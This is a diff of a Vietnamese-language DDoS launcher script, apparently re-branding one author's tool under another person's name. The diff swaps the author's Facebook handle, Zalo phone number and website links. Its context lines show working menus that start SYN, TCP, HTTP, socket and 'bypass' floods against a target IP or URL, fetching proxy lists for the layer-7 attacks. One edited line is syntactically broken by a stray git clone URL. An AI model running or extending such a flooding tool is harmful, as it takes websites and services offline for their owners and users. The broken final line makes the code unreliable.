@@ -48,10 +48,10 @@ class Home:
 	def home(self): # don't edit this banner lol
 		print(f"""
 ═════════════════════════
-➟ Facebook: @Users.ViDucHung.ProFile
-➟ Zalo: 0359822840
-➟ Github: https://github.com/Viduchung
-➟ Website: www.HungTricker.Xyz
+➟ Facebook: @Users.PhamTheSuong
+➟ Zalo: 113
+➟ Github: https://github.com/Ddos-V3
+➟ Website: https://github.com/Ddos-V3
 ═════════════════════════
 """)
 		print(Color.LC+"    Type "+Color.LB+"'HELP'"+Color.LC+" Để Xem All Lệnh\n\n")
@@ -264,7 +264,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" SOCKS5 PROXY")
 		print("\n")
 		while True:
-				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Vi Đức Hùng"+Color.LB+" --> "+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Pham The Suong"+Color.LB+" --> "+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 				option = input()
 				if option == '01' or option == '1':
 					with open("http.txt", 'w') as p:
@@ -297,7 +297,7 @@ class Tool:
 					subprocess.run(['pkill -f ViDucHung.py'], shell=True)
 				elif option == 'stop' or option == 'STOP':
 					subprocess.run(['pkill screen'], shell=True)
-					print(f"{Color.LG} Vi Đức Hùng: Done!")
+					print(f"{Color.LG} Pham The Suong: Done!")
 				elif option == "":
 					pass
 				else:
@@ -316,7 +316,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" EXTRACT LINK")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Vi Đức Hùng"+Color.LB+" --> "+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Pham The Suong"+Color.LB+" --> "+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option == '01' or option == '1':
 				while True:
@@ -481,7 +481,7 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
+					print(Color.LG+f"\n Pham The Suong: Done!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '03' or option == '3':
@@ -492,7 +492,7 @@ class Tool:
 					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
-					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
+					print(Color.LG+f"\n Pham The Suong: Done!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '04' or option == '4':
@@ -513,7 +513,7 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {port} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
+					print(Color.LG+f"\n Pham The Suong: Done!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == 'ref' or option == 'REF':
@@ -528,10 +528,10 @@ class Tool:
 			elif option == 'dev' or option == 'DEV':
 				print(self.dev)
 			elif option == 'exit' or option == 'EXIT':
-				subprocess.run(['pkill -f ViDucHung.py'], shell=True)
+				subprocess.run(['pkill -f Pham The Suong.py'], shell=True)
 			elif option == 'stop' or option == 'STOP':
 				subprocess.run(['pkill screen'], shell=True)
-				print(f"{Color.LG} Vi Đức Hùng: Done!")
+				print(f"{Color.LG} Pham The Suong: Done!")
 			elif option == '00' or option == '0':
 				os.system('clear');self.bbos()
 			elif option == "":
@@ -542,10 +542,10 @@ class Tool:
 	def l7(self):
 		print(f"""{Color.LG}
 ═════════════════════════
-➟ Facebook: @Users.ViDucHung.ProFile
-➟ Zalo: 0359822840
-➟ Github: https://github.com/Viduchung
-➟ Website: www.HungTricker.Xyz
+➟ Facebook: @Users.Pham The Suong
+➟ Zalo: 113
+➟ Github: https://github.com/Ddos-V3
+➟ Website: https://github.com/Ddos-V3
 ═════════════════════════
 """)
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Socket")
@@ -556,7 +556,7 @@ class Tool:
 		print("\n")
 		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Vi Đức Hùng"+Color.LB+" --> "+Color.LG+"DDoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Pham The Suong"+Color.LB+" --> "+Color.LG+"DDoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option == '01' or option == '1':
 				try:
@@ -567,7 +567,7 @@ class Tool:
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
-					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
+					print(Color.LG+f"\n Pham The Suong: Done!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '02' or option == '2':
@@ -578,7 +578,7 @@ class Tool:
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
-					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
+					print(Color.LG+f"\n Pham The Suong: Done!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '03' or option == '3':
@@ -589,7 +589,7 @@ class Tool:
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
-					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
+					print(Color.LG+f"\n Pham The Suong: Done!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '04' or option == '4':
@@ -600,7 +600,7 @@ class Tool:
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
-					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
+					print(Color.LG+f"\n Pham The Suong: Done!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == 'ref' or option == 'REF':
@@ -615,7 +615,7 @@ class Tool:
 			elif option == 'dev' or option == 'DEV':
 				print(self.dev)
 			elif option == 'exit' or option == 'EXIT':
-				subprocess.run(['pkill -f ViDucHung.py'], shell=True)
+				subprocess.run(['pkill -f Pham The Suong.py'], shell=True)
 			elif option == 'stop' or option == 'STOP':
 				subprocess.run(['pkill screen'], shell=True)
 				print(f"{Color.LG} Vi Đức Hùng: Done!")
@@ -655,7 +655,7 @@ def spoof_useragents():
 
 def main():
 	#  checking 
-	VDH_Tool.styleText("🌚 Đang Vào Tool...\n\n")
+	VDH_Tool.styleText("🌚 Sắp Ra Rồi...\n\n")
 	pkgs = ['screen', 'node']
 	install = True
 	for pkg in pkgs:
@@ -679,7 +679,7 @@ def main():
 		script = False
 	if script == False:sys.exit()
 	else:pass
-	VDH_Tool.home()
+	VDH_Tool.home()git clone : https://github.com/hidos123/Ddos-V3
 
 
 if __name__ == '__main__':
